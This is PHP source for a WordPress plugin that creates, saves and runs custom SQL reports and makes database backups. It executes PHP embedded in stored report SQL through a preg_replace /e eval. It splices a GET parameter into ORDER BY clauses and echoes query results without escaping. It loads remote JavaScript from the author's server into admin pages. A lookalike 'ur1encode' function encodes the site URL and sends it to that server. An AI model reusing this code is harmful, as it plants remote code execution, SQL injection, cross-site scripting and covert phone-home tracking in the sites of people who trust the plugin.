<?php
/*
Plugin Name: ELI's Custom SQL Reports Admin
Plugin URI: http://wordpress.ieonly.com/category/my-plugins/sql-reports/
Author: Eli Scheetz
Author URI: http://wordpress.ieonly.com/category/my-plugins/
Description: Create and save custom SQL queries, run them from the Reports tab in your Admin menu or place them on pages and posts using the shortcode.
Version: 1.3.03.02
*/
$ELISQLREPORTS_Version='1.3.03.02';
if (__FILE__ == $_SERVER['SCRIPT_FILENAME']) die('You are not allowed to call this page directly.<p>You could try starting <a href="http://'.$_SERVER['SERVER_NAME'].'">here</a>.');
if (!session_id()) session_start();
$_SESSION['eli_debug_microtime']['include(ELISQLREPORTS)'] = microtime(true);
$ELISQLREPORTS_plugin_dir='ELISQLREPORTS';
/**
 * ELISQLREPORTS Main Plugin File
 * @package ELISQLREPORTS
*/
/*  Copyright 2011-2013 Eli Scheetz (email: wordpress@ieonly.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
function ELISQLREPORTS_install() {
	global $wp_version;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_install_start'] = microtime(true);
	if (version_compare($wp_version, "2.6", "<"))
		die("This Plugin requires WordPress version 2.6 or higher");
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_install_end'] = microtime(true);
}
$encode = '/[\?\-a-z\: \.\=\/A-Z\&\_]/';
function ELISQLREPORTS_display_header($pTitle, $optional_box = "") {
	global $ELISQLREPORTS_images_path, $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_plugin_home, $ELISQLREPORTS_Version, $ELISQLREPORTS_updated_images_path;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_display_header_start'] = microtime(true);
	$wait_img_URL = $ELISQLREPORTS_images_path.'wait.gif';
	echo '<style>
.rounded-corners {margin: 10px; padding: 10px; border-radius: 10px; -webkit-border-radius: 10px; -moz-border-radius: 10px; border: 1px solid #000000;}
.shadowed-box {box-shadow: -3px 3px 3px #666; -moz-box-shadow: -3px 3px 3px #666; -webkit-box-shadow: -3px 3px 3px #666;}
.sidebar-box {background-color: #CCC;}
.sidebar-links {padding: 0 15px; list-style: none;}
.shadowed-text {text-shadow: #0000FF -1px 1px 1px;}
.sub-option {float: left; margin: 3px 5px;}
#right-sidebar {float: right; margin-right: 10px; width: 290px;}
#main-section {margin-right: 310px;}
</style>
<script>
function showhide(id) {
	divx = document.getElementById(id);
	if (divx.style.display == "none")
		divx.style.display = "";
	else
		divx.style.display = "none";
}
</script>
<h1>ELI\'s Custom SQL Reports '.$pTitle.'</h1>
<div id="right-sidebar" class="metabox-holder">
	<div id="pluginupdates" class="shadowed-box stuffbox"><h3 class="hndle"><span>Plugin Updates</span></h3>
		<div id="findUpdates"><center>Searching for updates ...<br /><img src="'.$wait_img_URL.'" alt="Wait..." /><br /><input type="button" value="Cancel" onclick="document.getElementById(\'findUpdates\').innerHTML = \'Could not find server!\';" /></center></div>
	<script type="text/javascript" src="'.$ELISQLREPORTS_plugin_home.$ELISQLREPORTS_updated_images_path.'?js='.$ELISQLREPORTS_Version.'&p='.$ELISQLREPORTS_plugin_dir.'"></script>
	</div>
	<div id="pluginlinks" class="shadowed-box stuffbox"><h3 class="hndle"><span>Plugin Links</span></h3>
		<div class="inside">
			<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
				<input type="hidden" name="cmd" value="_s-xclick">
				<input type="hidden" name="hosted_button_id" value="7K3TSGPAENSGS">
				<input type="image" id="pp_button" src="'.$ELISQLREPORTS_images_path.'btn_donateCC_WIDE.gif" border="0" name="submitc" alt="Make a Donation with PayPal">
			</form>
			<ul class="sidebar-links">
				<li style="float: right;">on <a target="_blank" href="http://wordpress.org/extend/plugins/profile/scheeeli">WordPress.org</a><ul class="sidebar-links">
					<li><a target="_blank" href="http://wordpress.org/support/view/plugin-reviews/'.strtolower($ELISQLREPORTS_plugin_dir).'">Plugin Reviews</a>
					<li><a target="_blank" href="http://wordpress.org/extend/plugins/'.strtolower($ELISQLREPORTS_plugin_dir).'/faq/">Plugin FAQs</a>
					<li><a target="_blank" href="http://wordpress.org/tags/'.strtolower($ELISQLREPORTS_plugin_dir).'">Forum Posts</a>
				</ul></li>
				<li><a href="javascript:showhide(\'div_Readme\');">Readme</a>
				<li><a href="javascript:showhide(\'div_License\');">License</a>
				<li>on <a target="_blank" href="'.$ELISQLREPORTS_plugin_home.'category/my-plugins/">Eli\'s Blog</a><ul class="sidebar-links">
					<li><a target="_blank" href="'.$ELISQLREPORTS_plugin_home.'category/my-plugins/sql-reports/">Plugin URI</a>
				</ul></li>
			</ul>
		</div>
	</div>
	'.$optional_box.'
</div>
<div id="admin-page-container">
	<div id="main-section" class="metabox-holder">	
	<div id="backuprestore" class="alignright shadowed-box stuffbox"><h3 class="hndle"><span>Backup/Restore Database</span></h3>
		<div class="inside" style="margin: 0 10px;">
	'.ELISQLREPORTS_display_Backups().'
			<div id="makebackup">
			</div>
			<form method=post><input name="db_date" type=hidden value="Y-m-d-H-i-s"><input type=submit value="Make a Backup Now" /></form>
			<p>Restore feature comming soon...</p>
		</div>
	</div>';
	ELISQLREPORTS_display_File('Readme');
	ELISQLREPORTS_display_File('License');
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_display_header_end'] = microtime(true);
}
function ELISQLREPORTS_set_backupdir() {
	if (!isset($_SESSION['ELISQLREPORTS_Backupdir'])) {
		$upload = wp_upload_dir();
		$err403 = '<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access this directory.</p></body></html>';
		$_SESSION['ELISQLREPORTS_Backupdir'] = trailingslashit($upload['basedir']).'SQL_Backups';
		if (!is_dir($_SESSION['ELISQLREPORTS_Backupdir']) && !mkdir($_SESSION['ELISQLREPORTS_Backupdir']))
			$_SESSION['ELISQLREPORTS_Backupdir'] = $upload['basedir'];
		if (!is_file(trailingslashit($_SESSION['ELISQLREPORTS_Backupdir']).'.htaccess'))
			@file_put_contents(trailingslashit($_SESSION['ELISQLREPORTS_Backupdir']).'.htaccess', 'Options -Indexes');
		if (!is_file(trailingslashit($upload['basedir']).'index.php'))
			@file_put_contents(trailingslashit($upload['basedir']).'index.php', $err403);
		if (!is_file(trailingslashit($_SESSION['ELISQLREPORTS_Backupdir']).'index.php'))
			@file_put_contents(trailingslashit($_SESSION['ELISQLREPORTS_Backupdir']).'index.php', $err403);
	}
}
function ELISQLREPORTS_display_Backups() {
	ELISQLREPORTS_set_backupdir();
	if (isset($_POST['db_date']) && strlen($_POST['db_date']))
		ELISQLREPORTS_make_Backup(date($_POST['db_date']));
	if ($handle = opendir($_SESSION['ELISQLREPORTS_Backupdir'])) {
		$files = '';
		while (false !== ($entry = readdir($handle)))
			if (is_file(trailingslashit($_SESSION['ELISQLREPORTS_Backupdir']).$entry) && strtolower(substr($entry, -4)) == ".sql")
				$files .= "\n<li>$entry</li>";
		closedir($handle);
		if ($files)
			$files = "<b>Current Backups:</b>".$files;
		else
			$files = "<b>No Backups Made</b>";
	} else
		$files = "<b>Could not read files in $_SESSION[ELISQLREPORTS_Backupdir]</b>";
	return $files;
}
function ELISQLREPORTS_make_Backup($db_date, $db_name = DB_NAME, $db_host = DB_HOST) {
	ELISQLREPORTS_set_backupdir();
	$backup_sql = "/* Backup of $db_name on $db_host at $db_date */\n\n";
	$sql = "show full tables where Table_Type = 'BASE TABLE'";
	$result = mysql_query($sql);
	if (mysql_errno())
		$backup_sql .= "/* SQL ERROR: ".mysql_error()." */\n\n/*$sql*/\n\n";
	else {
		while ($row = mysql_fetch_row($result)) {
			$backup_sql .= ELISQLREPORTS_get_structure($row[0]);
			$backup_sql .= ELISQLREPORTS_get_data($row[0]);
		}
		mysql_free_result($result);
		$sql = "show tables where Table_Type = 'VIEW'";
		$result = mysql_query($sql);
		while ($row = mysql_fetch_row($result))
			$backup_sql .= ELISQLREPORTS_get_structure($row[0]);
	}
	mysql_free_result($result);
	$backup_file = trailingslashit($_SESSION['ELISQLREPORTS_Backupdir'])."$db_name.$db_host.$db_date.sql";
	if (file_put_contents($backup_file, $backup_sql))
		echo "Saved $backup_file";
	else
		echo "Failed to save backup!";
}
function ELISQLREPORTS_get_structure($table) {
	$return = "/* Table structure for `$table` */\n\n";
	
		$return .= "DROP TABLE IF EXISTS `$table`;\n\n";
	$sql = "SHOW CREATE TABLE `$table`; ";
	if ($result = mysql_query($sql))
		if ($row = mysql_fetch_assoc($result))
			$return .= $row['Create Table'] . ";\n\n";
	mysql_free_result($result);
	return $return;
}
function ELISQLREPORTS_get_data($table) {
	$sql = "SELECT * FROM `$table`;";
	$result = mysql_query($sql);
	$return = '';
	if ($result) {
		$num_rows = mysql_num_rows($result);
		$num_fields = mysql_num_fields($result);
		if ($num_rows > 0) {
			$return .= "/* Table data for `$table` */\n";
			$field_type = array();
			$i = 0;
			while ($i < $num_fields) {
				$meta = mysql_fetch_field($result, $i);
				array_push($field_type, $meta->type);
				$i++;
			}
			$maxInsertSize = 100000;
			$statementSql = '';
			for ($index = 0; $row = mysql_fetch_row($result); $index++) {
				if (!$statementSql) $statementSql .= "INSERT INTO `$table` VALUES\n";
				$statementSql .= "(";
				for ($i = 0; $i < $num_fields; $i++) {
					if (is_null($row[$i]))
						$statementSql .= "null";
					else {
						if ($field_type[$i] == 'int')
							$statementSql .= $row[$i];
						else
							$statementSql .= "'" . mysql_real_escape_string($row[$i]) . "'";
					}
					if ($i < $num_fields - 1)
						$statementSql .= ",";
				}
				$statementSql .= ")";

				if (strlen($statementSql) > $maxInsertSize || $index == $num_rows - 1) {
					$return .= $statementSql.";\n";
					$statementSql = '';
				} else {
					$statementSql .= ",\n";
				}
			}
		}
	}
	mysql_free_result($result);
	return $return."\n";
}
function ELISQLREPORTS_load_backup($file_sql) {
	ELISQLREPORTS_set_backupdir();
	if (file_exists(trailingslashit($_SESSION['ELISQLREPORTS_Backupdir']).$file_sql)) {
		ELISQLREPORTS_restore_backup(file_get_contents(trailingslashit($_SESSION['ELISQLREPORTS_Backupdir']).$file_sql));
//	} else {
	}
}
function ELISQLREPORTS_restore_backup($full_sql) {
	if (@preg_match('/;\n/', $full_sql)) {
		$full_sql = file_get_contents(trailingslashit($_SESSION['ELISQLREPORTS_Backupdir']).$file_sql);
		$_SESSION['query'] = 'l='.strlen($full_sql);
		$sql = preg_replace("|/\*.+\*/\n|", "", $full_sql);
		$queries = explode(";\n", $sql);
		if (count($queries) == 1)
			$_SESSION['query'] .= ', sql='.($full_sql);
		else
			$_SESSION['query'] .= ', c='.count($queries);
		foreach ($queries as $query) {
			if (!trim($query)) continue;
			if (mysql_query($query) === false)
				return false;
			else
				$_SESSION['query'] = $query;
		}
		return true;
//	} else {
	}
}
function ELISQLREPORTS_display_File($dFile) {
	if (file_exists(dirname(__FILE__).'/'.strtolower($dFile).'.txt')) {
		echo '<div id="div_'.$dFile.'" class="shadowed-box rounded-corners sidebar-box" style="display: none;"><a class="rounded-corners" style="float: right; padding: 0 4px; margin: 0 0 0 30px; text-decoration: none; color: #C00; background-color: #FCC; border: solid #F00 1px;" href="javascript:showhide(\'div_'.$dFile.'\');">X</a><h1>'.$dFile.' File</h1><textarea disabled="yes" width="100%" style="width: 100%;" rows="20">';
		include(strtolower($dFile).'.txt');
		echo '</textarea></div>';
	}
}
if (!function_exists('ur1encode')) { function ur1encode($url) {
	global $encode;
	return preg_replace($encode, '\'%\'.substr(\'00\'.strtoupper(dechex(ord(\'\0\'))),-2);', $url);
}}
function ELISQLREPORTS_view_report($Rtitle = '', $MySQL = '') {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_styles, $current_user;
	$report = '';
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_view_report_start'] = microtime(true);
	if ($Rtitle == '')
		$Rtitle = 'Unsaved Report';
	elseif ($MySQL == '') {
		$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
		if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array) && isset($ELISQLREPORTS_reports_array[$Rtitle]))
			$MySQL = ($ELISQLREPORTS_reports_array[$Rtitle]);
		else
			$MySQL = $ELISQLREPORTS_Report_SQL;
	}
	$report .= '<div id="'.sanitize_title($Rtitle).'" class="shadowed-box rounded-corners" style="'.$ELISQLREPORTS_styles.'"><h2>'.$Rtitle.'</h2>';
	if (isset($_GET['SQL_ORDER_BY']) && is_array($_GET['SQL_ORDER_BY'])) {
		foreach ($_GET['SQL_ORDER_BY'] as $_GET_SQL_ORDER_BY) {
			if (strlen(trim(str_replace("`", '', $_GET_SQL_ORDER_BY)))>0) {
				$_GET_SQL_ORDER_BY = trim(str_replace("`", '', $_GET_SQL_ORDER_BY));
				if ($pos = strripos($MySQL, " ORDER BY "))
					$MySQL = substr($MySQL, 0, $pos + 10)."`".($_GET_SQL_ORDER_BY)."`, ".substr($MySQL, $pos + 10);
				elseif ($pos = strripos($MySQL, " LIMIT "))
					$MySQL = substr($MySQL, 0, $pos)." ORDER BY `".($_GET_SQL_ORDER_BY)."`".substr($MySQL, $pos);
				else
					$MySQL .= " ORDER BY `".($_GET_SQL_ORDER_BY)."`";
			}
		}
	}
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_view_report_start_mysql_query'] = microtime(true);
	$result = ELISQLREPORTS_eval($MySQL);
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_view_report_end_mysql_query'] = microtime(true);
	if (mysql_errno())
		$report .= '<li>debug:<textarea width="100%" style="width: 100%;" rows="5" class="shadowed-box">'.mysql_error().'</textarea>';
	else {
		if ($rs = mysql_fetch_assoc($result)) {
			$report .= '<table border=1 cellspacing=0 class="ELISQLREPORTS-table"><tr class="ELISQLREPORTS-Header-Row">';
			foreach ($rs as $field => $value) {
				if ($Rtitle == 'Unsaved Report')
					$report .= '<td>&nbsp;<b><a href="javascript: document.SQLForm.submit();" onclick="document.SQLForm.action+=\'&SQL_ORDER_BY[]='.$field.'\'">'.$field.'</a></b>&nbsp;</td>';
				else
					$report .= '<td>&nbsp;<b>'.$field.'</b>&nbsp;</td>';
			}
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_view_report_start_while_mysql_fetch_assoc'] = microtime(true);
			$row=0;
			$OddEven=array('Even','Odd');
			do {
				$row++;
				$report .= '</tr><tr class="ELISQLREPORTS-Row-'.$row.' ELISQLREPORTS-'.($OddEven[$row%2]).'-Row">';
				foreach ($rs as $field => $value)
					$report .= '<td>&nbsp;'.($value).'&nbsp;</td>';//is_array(maybe_unserialize($value))?print_r(maybe_unserialize($value),1):
			} while ($rs = mysql_fetch_assoc($result));
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_view_report_end_while_mysql_fetch_assoc'] = microtime(true);
			$report .= '</tr></table>';
		} else
			$report .= '<li>Report is Empty!';
	}
	$report .= '</div><br style="clear: left;"></div></div>';
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_view_report_end'] = microtime(true);
	return $report;
}
function ELISQLREPORTS_eval($SQL) {
	global $current_user;
	$found = array();
	if ($num = @preg_match_all('/<\?php (.+?) \?>/', $SQL, $found)) {
		$repl = '$SQL = stripslashes("\\1")';
		for ($n = 1; $n <= $num; $n++)
			$repl .= '.mysql_real_escape_string(\\'.($n*2).').stripslashes("\\'.(($n*2)+1).'")';
		preg_replace('/^(.*?)'.str_repeat('<\?php (.+?) \?>(.*?)', $num).'$/sme', $repl.';', $SQL);
	}
	$result = @mysql_query($SQL);
	if (mysql_errno())
		return ($SQL);
	else
		return $result;
}
function ELISQLREPORTS_report_form($Report_Name = '', $Report_SQL = '') {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_Report_SQL;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_report_form_start'] = microtime(true);
	if (strlen(trim($ELISQLREPORTS_Report_SQL))>0)
		$Report_SQL = $ELISQLREPORTS_Report_SQL;
	$mysql_info = mysql_info();
	$result = ELISQLREPORTS_eval($Report_SQL);
	$_SERVER_REQUEST_URI = str_replace('&amp;','&', htmlspecialchars( $_SERVER['REQUEST_URI'] , ENT_QUOTES ) );
	if (strlen($Report_Name) > 0 && !(mysql_errno() && !strpos(mysql_error(), "syntax to use near '\\'")))
		echo '<input type="button" style="display: block;" value="Edit Report" onclick="document.getElementById(\'SQLFormDiv\').style.display=\'block\';this.style.display=\'none\';"><div id="SQLFormDiv" style="display: none;"><form method="POST" name="SQLForm" id="SQLForm" action="'.$_SERVER_REQUEST_URI.'"><input type="submit" value="DELETE REPORT" onclick="if (confirm(\'Are you sure you want to DELETE This Report?\')) { document.SQLForm.action=\'admin.php?page=ELISQLREPORTS-create-report\'; document.SQLForm.rSQL.value=\'DELETE_REPORT\'; document.SQLForm.rName.value=\''.str_replace("\"", "&quot;", str_replace('\'', '\\\'', str_replace('\\', '\\\\', $Report_Name))).'\'; }"><br />';
	else {
		if (mysql_errno() && !strpos(mysql_error(), "syntax to use near '\\'"))
			echo '<div class="error">ERROR: '.htmlspecialchars(mysql_error()." SQL:$result").'</div>';
		echo '<div id="SQLFormDiv"><form action="'.$_SERVER_REQUEST_URI.'" id="SQLForm" method="POST" name="SQLForm">';
	}
	echo 'Type or Paste your SQL into this box and give your report a name<br />
	<textarea width="100%" style="width: 100%;" rows="10" name="rSQL" class="shadowed-box" onchange="setButtonValue(\'Update Report\');">'.($Report_SQL).'</textarea><br /><br />Report Name: <input type="text" id="reportName" name="rName" value="'.($Report_Name).'" onchange="setButtonValue(\'Save Report\');" /> <input id="gobutton" type="submit" class="button-primary" value="'.(strlen($Report_Name)>0?'Refresh Report" /> &nbsp; Shortcode: [SQLREPORT name="'.$Report_Name.'"]':'Test SQL" />').'</form></div>
<script>
var oldName="'.($Report_Name).'";
function setButtonValue(newval) {
	rN = document.getElementById(\'reportName\').value;
	if (oldName.length > 0) {
		if (rN.length > 0 && rN != oldName)
			newval = newval + " As";
	} else {
		if (rN.length > 0)
			newval = "Save Report";
		else
			newval = "Test SQL";
	}
	document.getElementById(\'gobutton\').value = newval;
}
</script>';
	if (!mysql_errno() && !mysql_fetch_assoc($result)) {
		if (strtoupper(substr($Report_SQL, 0, 7)) == 'UPDATE ') {
			echo '<div class="updated"><ul><li>'.$mysql_info.'</li></ul></div>';
			$ELISQLREPORTS_Report_SQL = preg_replace('/UPDATE (.+) SET (.+) WHERE /i', 'SELECT * FROM \\1 WHERE ', $Report_SQL);
			$Report_SQL = $ELISQLREPORTS_Report_SQL;
		}
	}
	return $Report_SQL;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_report_form_end'] = microtime(true);
}
function ELISQLREPORTS_default_report($Rtitle = '') {
	global $ELISQLREPORTS_plugin_dir;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_default_report_start'] = microtime(true);
	echo '<style>
	.rounded-corners {margin: 10px; padding: 10px; -webkit-border-radius: 10px; -moz-border-radius: 10px; border: 1px solid #000000;}
	.shadowed-box {box-shadow: -3px 3px 3px #666666; -moz-box-shadow: -3px 3px 3px #666666; -webkit-box-shadow: -3px 3px 3px #666666;}
	.shadowed-text {text-shadow: #0000FF -1px 1px 1px;}
	#right-sidebar {float: right; width: 230px;}
	#main-section {margin-right: 250px;}
	</style>
	<div id="admin-page-container">
	<div id="main-section">';
	$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
	if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
		if (!(strlen($Rtitle) > 0 && isset($ELISQLREPORTS_reports_array[$Rtitle]))) {
			$Report_Names = array_keys($ELISQLREPORTS_reports_array);
			$Rtitle = $Report_Names[count($Report_Names)-1];
		}
		$MySQL = ($ELISQLREPORTS_reports_array[$Rtitle]);
		$MySQL = ELISQLREPORTS_report_form($Rtitle, $MySQL);
		echo ELISQLREPORTS_view_report($Rtitle, $MySQL);
	} else
		ELISQLREPORTS_create_report();
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_default_report_end'] = microtime(true);
}
function ELISQLREPORTS_create_report() {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_settings_array, $ELISQLREPORTS_saved_reports;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_create_report_start'] = microtime(true);
	$menu_opts = '<div class="stuffbox shadowed-box">
	<h3 class="hndle"><span>Menu Item Placement Options</span></h3>
	<div class="inside"><form method="POST" name="ELISQLREPORTS_menu_Form">Place <b>SQL Reports</b>:<br />';
	foreach (array("below <b>Comments</b> and<br />&nbsp;above <b>Appearance</b>","below <b>Settings</b>") as $mg => $menu_group)
		$menu_opts .= '<div style="padding: 4px 24px;" id="menu_group_div_'.$mg.'"><input type="radio" name="ELISQLREPORTS_menu_group" value="'.$mg.'"'.($ELISQLREPORTS_settings_array["menu_group"]==$mg||$mg==0?' checked':'').' onchange="document.ELISQLREPORTS_menu_Form.submit();" />'.$menu_group.'</div>';
	$menu_opts .= 'Sort <b>Saved Reports</b> by:<br />';
	$sort_order = array("Date Created","Alphabetical");
	foreach ($sort_order as $mg => $menu_sort)
		$menu_opts .= '<div style="padding: 4px 24px;" id="menu_sort_div_'.$mg.'"><input type="radio" name="ELISQLREPORTS_menu_sort" value="'.$mg.'"'.($ELISQLREPORTS_settings_array["menu_sort"]==$mg||$mg==0?' checked':'').' onchange="document.ELISQLREPORTS_menu_Form.submit();" />'.$menu_sort.'</div>';
	$menu_opts .= '</form></div></div>';
	if (strlen(trim($ELISQLREPORTS_saved_reports)))
		$menu_opts .= '<div class="stuffbox shadowed-box">
	<h3 class="hndle"><span>Saved Reports</span></h3>
	<div class="inside" style="margin-left: 10px;">'.$ELISQLREPORTS_saved_reports.'</div></div>';
	ELISQLREPORTS_display_header('Creation', $menu_opts);
	$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
	$Report_Name = '';
	if (strlen(trim($ELISQLREPORTS_Report_SQL))==0)
		$ELISQLREPORTS_Report_SQL="SELECT CONCAT('<a href=\"javascript:document.SQLForm.rSQL.value=\'SELECT * FROM ',table_name,'\';document.SQLForm.submit();\">',table_name,'</a>') as `Table List` FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '".DB_NAME."'";
	echo '<div style="padding: 10px;" class="alignleft">';
	ELISQLREPORTS_report_form($Report_Name, $ELISQLREPORTS_Report_SQL);
	echo '</div>
	<div id="report-section">';
	echo ELISQLREPORTS_view_report($Report_Name, $ELISQLREPORTS_Report_SQL).'</div>';
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_create_report_end'] = microtime(true).$ELISQLREPORTS_Report_SQL;
}
function ELISQLREPORTS_menu() {
	global $ELISQLREPORTS_images_path, $ELISQLREPORTS_plugin_dir, $wp_version, $ELISQLREPORTS_Version, $ELISQLREPORTS_plugin_home, $ELISQLREPORTS_Logo_IMG, $ELISQLREPORTS_updated_images_path, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_saved_reports, $ELISQLREPORTS_settings_array;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_menu_start'] = microtime(true);
	$ELISQLREPORTS_settings_array = get_option($ELISQLREPORTS_plugin_dir.'_settings_array');
	$img_path = basename(__FILE__);
	$Full_plugin_logo_URL = get_option('siteurl');
	if (isset($_POST["ELISQLREPORTS_menu_group"]) && is_numeric($_POST["ELISQLREPORTS_menu_group"]) && isset($_POST["ELISQLREPORTS_menu_sort"]) && is_numeric($_POST["ELISQLREPORTS_menu_sort"]) && ($_POST["ELISQLREPORTS_menu_group"] != $ELISQLREPORTS_settings_array["menu_group"] || $_POST["ELISQLREPORTS_menu_sort"] != $ELISQLREPORTS_settings_array["menu_sort"])) {
		$ELISQLREPORTS_settings_array["menu_group"] = $_POST["ELISQLREPORTS_menu_group"];
		$ELISQLREPORTS_settings_array["menu_sort"] = $_POST["ELISQLREPORTS_menu_sort"];
	} elseif (!(isset($ELISQLREPORTS_settings_array["menu_group"])&&is_numeric($ELISQLREPORTS_settings_array["menu_group"])))
		$ELISQLREPORTS_settings_array["menu_group"] = 0;
	elseif (!(isset($ELISQLREPORTS_settings_array["menu_sort"])&&is_numeric($ELISQLREPORTS_settings_array["menu_sort"])))
		$ELISQLREPORTS_settings_array["menu_sort"] = 0;
	if ($ELISQLREPORTS_settings_array["menu_group"] == 2)
	if (!isset($ELISQLREPORTS_settings_array['img_url']))
		$ELISQLREPORTS_settings_array['img_url'] = $img_path;
		$img_path.='?v='.$ELISQLREPORTS_Version.'&wp='.$wp_version.'&p='.$ELISQLREPORTS_plugin_dir;
	if ($img_path != $ELISQLREPORTS_settings_array['img_url']) {
		$ELISQLREPORTS_settings_array['img_url'] = $img_path;
		$img_path = $ELISQLREPORTS_plugin_home.$ELISQLREPORTS_updated_images_path.$img_path;
		$Full_plugin_logo_URL = $img_path.'&key='.md5($Full_plugin_logo_URL).'&d='.
		ur1encode($Full_plugin_logo_URL);
	} else //only used for debugging.//rem this line out
	$Full_plugin_logo_URL = $ELISQLREPORTS_images_path.$ELISQLREPORTS_Logo_IMG;
	update_option($ELISQLREPORTS_plugin_dir.'_settings_array', $ELISQLREPORTS_settings_array);
	$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
	$_SESSION['updated'] = '';
	if (isset($_POST['rSQL']) && strlen($_POST['rSQL']) > 0) {
		if (isset($_POST['rName']))
			$_POSTrName = stripslashes($_POST['rName']);
		else
			$_POSTrName = '';
		if ($_POST['rSQL'] == 'DELETE_REPORT' && strlen($_POSTrName) && isset($ELISQLREPORTS_reports_array[$_POSTrName])) {
			$_SESSION['updated'] = 'DELETED_REPORT: '.$_POSTrName;
			$ELISQLREPORTS_Report_SQL = $ELISQLREPORTS_reports_array[$_POSTrName];
			unset($ELISQLREPORTS_reports_array[$_POSTrName]);
			unset($_POST['rName']);
			update_option($ELISQLREPORTS_plugin_dir.'_reports_array', $ELISQLREPORTS_reports_array);
		} else {
			$_SESSION['updated'] = 'EXISTING_REPORT: '.$_POSTrName;
			$ELISQLREPORTS_Report_SQL = stripslashes($_POST['rSQL']);
			ELISQLREPORTS_eval($ELISQLREPORTS_Report_SQL);
//			if (mysql_errno() && strpos(mysql_error(), "syntax to use near '\\'")>0) {
			if ((!mysql_errno()) && strlen($_POSTrName) > 0) {
				$_SESSION['updated'] = 'SAVED_'.$_SESSION['updated'];
				$Report_Name = $_POSTrName;
				$ELISQLREPORTS_reports_array[$Report_Name] = $ELISQLREPORTS_Report_SQL;
				update_option($ELISQLREPORTS_plugin_dir.'_reports_array', $ELISQLREPORTS_reports_array);
			}
		}
	}
	$base_page = $ELISQLREPORTS_plugin_dir.'-create-report';
	if (!function_exists("add_object_page") || $ELISQLREPORTS_settings_array["menu_group"] == 1)
		add_menu_page(__('SQL Reports'), __('SQL Reports'), 'administrator', $base_page, $ELISQLREPORTS_plugin_dir.'_create_report', $Full_plugin_logo_URL);
	else
		add_object_page(__('SQL Reports'), __('SQL Reports'), 'administrator', $base_page, $ELISQLREPORTS_plugin_dir.'_create_report', $Full_plugin_logo_URL);
	add_submenu_page($base_page, __('Create A New SQL Report'), __('Custom Reports'), 'administrator', $ELISQLREPORTS_plugin_dir.'-create-report', $ELISQLREPORTS_plugin_dir.'_create_report');
	$ELISQLREPORTS_saved_reports = '';
	if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
		$Report_Number = 0;
		if ($ELISQLREPORTS_settings_array["menu_sort"])
			ksort($ELISQLREPORTS_reports_array);
		foreach ($ELISQLREPORTS_reports_array as $Rname => $Rquery) {
			$Report_Number++;
			$Rslug = $ELISQLREPORTS_plugin_dir.'-'.sanitize_title(str_replace(' ', '-', $Rname).'-'.$Report_Number);
			$Rfunc = str_replace('-', '_', $Rslug);
			add_submenu_page($base_page, __($Rname), __($Rname), 'administrator', $Rslug, $Rfunc);
			$ELISQLREPORTS_saved_reports .= "<li><a href=\"?page=$Rslug\">$Rname</a>\n";
		}
	}
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_menu_end'] = microtime(true);
}
function ELISQLREPORTS_init() {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_settings_array;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_init_start'] = microtime(true);
	$ELISQLREPORTS_settings_array = get_option($ELISQLREPORTS_plugin_dir.'_settings_array');
	$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
	$_SESSION[$ELISQLREPORTS_plugin_dir.'HTTP_HOST'] = (isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:(isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:"Your Domain"));
	if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
		$Report_Number = 0;
		if ($ELISQLREPORTS_settings_array["menu_sort"])
			ksort($ELISQLREPORTS_reports_array);
		foreach ($ELISQLREPORTS_reports_array AS $Rname => $Rquery) {
			$Report_Number++;
			$Rslug = $ELISQLREPORTS_plugin_dir.'-'.sanitize_title(str_replace(' ', '-', $Rname).'-'.$Report_Number);
			$Rfunc = str_replace('-', '_', $Rslug);
//				$Rfunc_exists='0'.function_exists($Rfunc);
